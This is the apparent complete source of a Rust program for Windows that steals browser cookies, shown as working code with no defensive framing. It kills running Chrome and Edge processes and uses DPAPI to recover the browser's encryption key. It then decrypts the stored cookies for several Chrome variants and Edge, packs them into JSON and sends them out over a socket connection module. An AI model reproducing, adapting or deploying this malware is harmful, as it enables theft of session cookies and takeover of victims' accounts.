use std::{
    collections::HashMap,
    path::{PathBuf, Path},
    ptr::null_mut,
    slice,
    time::{SystemTime, UNIX_EPOCH},
    fs,
    env
};

use sysinfo::{ProcessExt, System, SystemExt};
use openssl::symm::Mode;
use types::DataSave;
use uuid::Uuid;
use serde_json::{from_str, to_string as to_json};
use winapi::um::{dpapi::CryptUnprotectData, wincrypt::CRYPTOAPI_BLOB};
use openssl::symm::{Cipher, Crypter};
use rusqlite::{Connection, Result};
use base64::{Engine as _, engine::general_purpose};

mod types;
mod socket_connection;

fn unprotect(data: &mut Vec<u8>) -> Result<Vec<u8>> {
    let mut data_in = CRYPTOAPI_BLOB { cbData: data.len() as u32, pbData: data.as_mut_ptr() };
    let mut data_out = CRYPTOAPI_BLOB { cbData: 0, pbData: null_mut() };
    unsafe {
        CryptUnprotectData(&mut data_in, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut data_out);
        let bytes = slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
        Ok(bytes)
    }
}

fn sql_reader(file_name: &str, decryption_key: &Vec<u8>) -> Result<DataSave> {
    let sql = Connection::open(&file_name).unwrap();
    let mut cookies_data = sql.prepare("SELECT host_key, name, value, encrypted_value FROM cookies").unwrap();
    let row = cookies_data.query_map((), |row| {
        Ok(types::Database {
            host_key: row.get(0)?,
            name: row.get(1)?,
            value: row.get(2)?,
            encrypted_value: row.get(3)?
        })
    });

    let mut decryption_data: Vec<types::DataStorage> = Vec::new();

    for cookie in row.unwrap() {
        let decoded_cookie = cookie.unwrap();

        let data_to_dec = decoded_cookie.encrypted_value.unwrap();
        let nonce = &data_to_dec[3..15];
        let ciphertext = &data_to_dec[15..(&data_to_dec.len() - 16)];

        let t = Cipher::aes_256_gcm();
        let mut decoder = Crypter::new(t, Mode::Decrypt, &decryption_key, Some(nonce)).unwrap();
        let mut result = vec![0; &ciphertext.len() + t.block_size() - 1];
        decoder.update(ciphertext, &mut result).expect("Cannot update crypter");

        decryption_data.push(types::DataStorage {
            host: decoded_cookie.host_key,
            name: decoded_cookie.name,
            value: unsafe { String::from_utf8_unchecked(result) }
        });
    }

    Ok(types::DataSave {
        timestamp: SystemTime::now().duration_since(UNIX_EPOCH).expect("Cannot get timestamp").as_secs(),
        cookies: decryption_data
    })
}

fn get_cookies(path: &PathBuf) {
    let user_data = path.clone().join("User Data");
    let cookies_file = user_data.clone().join("Default/Network/Cookies");
    let key_file = user_data.clone().join("Local State");
    
    if !cookies_file.exists() || !key_file.exists() {
        return;
    }

    let encrypto_key_file = fs::read_to_string(key_file).unwrap();
    let enc_key = from_str::<types::KeyFileData>(&encrypto_key_file).unwrap().os_crypt.encrypted_key;
    let mut encrypto_key = general_purpose::STANDARD.decode(&enc_key).unwrap();
    encrypto_key = (&encrypto_key[5..]).to_vec();
    let decrypto_key = unprotect(&mut encrypto_key).unwrap();

    let copy_file_uuid = Uuid::new_v4();
    let file_name = format!(".{}", copy_file_uuid.simple());

    loop {
        match fs::copy(cookies_file.clone(), &file_name) {
            Ok(_) => break,
            Err(_) => ()
        };
    }

    let data = sql_reader(&file_name, &decrypto_key).unwrap();
    let data_save = to_json(&data).unwrap();

    fs::remove_file(&file_name).unwrap();

    socket_connection::send_buffer(&data_save.as_bytes()).unwrap();

    // fs::write(format!("dt.{}.json", path.file_name().unwrap().to_str().unwrap()), &data_save).expect("Cannot save file");
}

fn get_google_cookies(local_path: &PathBuf) {
    let google_user_data_path = local_path.join("Google");

    let chrome_path = google_user_data_path.clone().join("Chrome");
    if chrome_path.exists() {
        get_cookies(&chrome_path);
    }

    let chrome_beta_path = google_user_data_path.clone().join("Chrome Beta");
    if chrome_beta_path.exists() {
        get_cookies(&chrome_beta_path);
    }

    let chrome_canary_path = google_user_data_path.clone().join("Chrome SxS");
    if chrome_canary_path.exists() {
        get_cookies(&chrome_canary_path);
    }

    let chromium_path = google_user_data_path.clone().join("Chromium");
    if chromium_path.exists() {
        get_cookies(&chromium_path);
    }
}

fn get_edge_cookies(local_path: &PathBuf) {
    let edge_user_data_path = local_path.join("Microsoft/Edge");
    if edge_user_data_path.exists() {
        get_cookies(&edge_user_data_path);
    }
}
fn kill_process(all_process: &System, process: &dyn ProcessExt, killed: &mut HashMap<String, bool>) {
    if killed.get(process.name()).is_some() {
        return
    }

    let parent = match process.parent() {
        Some(pid) => pid,
        None => return
    };

    if let Some(proc) = all_process.process(parent) {
        if proc.name() != "explorer.exe" {
            proc.kill();
            killed.insert(process.name().to_owned(), true);
        }
    }
}

fn main() {
    let appdata_roaming_path = env::var("APPDATA").unwrap().to_string();
    let appdata_path = Path::new(&appdata_roaming_path).parent().unwrap();
    let local_path = Path::new(&appdata_path.to_str().unwrap()).join("Local");

    let mut system = System::new();
    system.refresh_processes();

    let mut killed: HashMap<String, bool> = HashMap::new();

    for (_, process) in system.processes() {
        match process.name() {
            "chrome.exe" => kill_process(&system, process, &mut killed),
            "msedge.exe" => kill_process(&system, process, &mut killed),
            _ => continue
        };
    }

    get_google_cookies(&local_path);
    get_edge_cookies(&local_path);
}
